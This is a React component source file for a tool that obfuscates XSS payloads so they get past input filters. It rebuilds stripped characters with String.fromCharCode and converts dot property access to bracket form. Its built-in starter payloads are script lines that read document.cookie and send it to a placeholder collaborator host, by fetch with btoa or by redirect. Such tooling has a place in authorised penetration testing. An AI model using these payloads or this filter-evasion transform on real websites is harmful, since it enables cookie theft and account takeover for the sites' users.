import { useMemo, useState } from 'react';

/*
 * String.fromCharCode helper. Rewrites a payload so characters an endpoint
 * strips are reconstructed at runtime:
 *   - inside a JS string: each listed char -> ' + String.fromCharCode(code) + '
 *     ('asd.asd' -> 'asd' + String.fromCharCode(46) + 'asd')
 *   - outside a string (property access): .prop -> ['prop']
 *     (document.cookie -> document['cookie'])  [toggle]
 * Quote-aware so the two don't collide. Runs entirely client-side.
 *
 * Host seams (props): openModal({code,label}) shows the "view" popup (button
 * hidden when absent); onBurst() fires on a successful copy.
 */

/* Starter payloads — click a chip to load one. The first is the default. */
const EXAMPLES = [
  {
    label: 'fetch + btoa exfil',
    code: "<script>fetch('http://YOUR-COLLABORATOR-ID.oastify.com' + btoa(document.cookie));</script>",
  },
  {
    label: 'location redirect',
    code: "window.location='http://YOUR-COLLABORATOR-ID.oastify.com'+document.cookie;",
  },
];
const DEFAULT_INPUT = EXAMPLES[0].code;

function transform(input, chars, bracket, advanced) {
  // advanced mode avoids the period in the method call too: String['fromCharCode'](n)
  const fcc = advanced ? "String['fromCharCode']" : 'String.fromCharCode';
  const targets = new Set(chars.split('').filter(Boolean));
  let out = '';
  let quote = null; // active string delimiter, or null when outside a string
  for (let i = 0; i < input.length; i++) {
    const c = input[i];
    if (quote) {
      if (c === '\\') { out += c + (input[i + 1] || ''); i++; continue; } // keep escapes
      if (c === quote) { quote = null; out += c; continue; }
      if (targets.has(c)) {
        out += quote + ' + ' + fcc + '(' + c.charCodeAt(0) + ') + ' + quote;
        continue;
      }
      out += c;
    } else {
      if (c === "'" || c === '"') { quote = c; out += c; continue; }
      if (bracket && c === '.') {
        const m = /^\.([A-Za-z_$][\w$]*)/.exec(input.slice(i));
        if (m) { out += "['" + m[1] + "']"; i += m[0].length - 1; continue; }
      }
      out += c;
    }
  }
  return out;
}

export default function CharCodeTool({ advanced = false, openModal, onBurst = () => {} }) {
  const [input, setInput] = useState(DEFAULT_INPUT);
  const [chars, setChars] = useState('.');
  // Advanced mode is period-free, so property access must be bracketed too.
  const [bracket, setBracket] = useState(true);
  const [copied, setCopied] = useState('');

  const output = useMemo(
    () => (input ? transform(input, chars, bracket, advanced) : ''),
    [input, chars, bracket, advanced]
  );
  const encoded = useMemo(() => (output ? encodeURIComponent(output) : ''), [output]);

  function copy(which, value) {
    if (!value) return;
    const done = () => {
      setCopied(which);
      onBurst();
      setTimeout(() => setCopied(''), 1400);
    };
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(value).then(done, done);
    } else {
      done();
    }
  }

  return (
    <div className="tool">
      <div className="tool-row" style={{ gap: 6 }}>
        {EXAMPLES.map((ex) => (
          <button
            key={ex.label}
            type="button"
            className={'chip' + (input === ex.code ? ' active' : '')}
            onClick={() => setInput(ex.code)}
          >
            {ex.label}
          </button>
        ))}
      </div>
      <div className="tool-row">
        <label className="tool-wide">
          payload
          <textarea
            value={input}
            rows={3}
            spellCheck={false}
            autoComplete="off"
            onChange={(e) => setInput(e.target.value)}
          />
        </label>
      </div>
      <div className="tool-row">
        <label>
          characters to replace
          <input
            type="text"
            value={chars}
            spellCheck={false}
            autoComplete="off"
            onChange={(e) => setChars(e.target.value)}
          />
        </label>
      </div>
      <label className="toggle-line">
        <input type="checkbox" checked={bracket} onChange={(e) => setBracket(e.target.checked)} />
        property access: <code className="inline">obj.x</code> → <code className="inline">obj['x']</code>
      </label>

      <div className="tool-out">
        <div className="tool-line">
          <span className="k">output</span>
          {openModal && (
            <button type="button" className="mini-copy" onClick={() => openModal({ code: output, label: 'output' })}>view</button>
          )}
          <button
            type="button"
            className={'mini-copy' + (copied === 'raw' ? ' copied' : '')}
            onClick={() => copy('raw', output)}
          >
            {copied === 'raw' ? 'copied ✓' : 'copy'}
          </button>
        </div>
        <pre className="charcode-out"><code>{output || '—'}</code></pre>

        <div className="tool-line">
          <span className="k">url-encoded</span>
          {openModal && (
            <button type="button" className="mini-copy" onClick={() => openModal({ code: encoded, label: 'url-encoded' })}>view</button>
          )}
          <button
            type="button"
            className={'mini-copy' + (copied === 'url' ? ' copied' : '')}
            onClick={() => copy('url', encoded)}
          >
            {copied === 'url' ? 'copied ✓' : 'copy'}
          </button>
        </div>
        <pre className="charcode-out"><code>{encoded || '—'}</code></pre>
      </div>

      <p className="hint">
        Inside strings each listed character becomes{' '}
        <code className="inline">
          {advanced ? "' + String['fromCharCode'](code) + '" : "' + String.fromCharCode(code) + '"}
        </code>; outside strings <code className="inline">.prop</code> becomes{' '}
        <code className="inline">['prop']</code> (toggle above).
        {advanced && ' Advanced mode uses bracket access for the method call too, so the output has no periods at all.'}
        {' '}Runs entirely in your browser.
      </p>
    </div>
  );
}
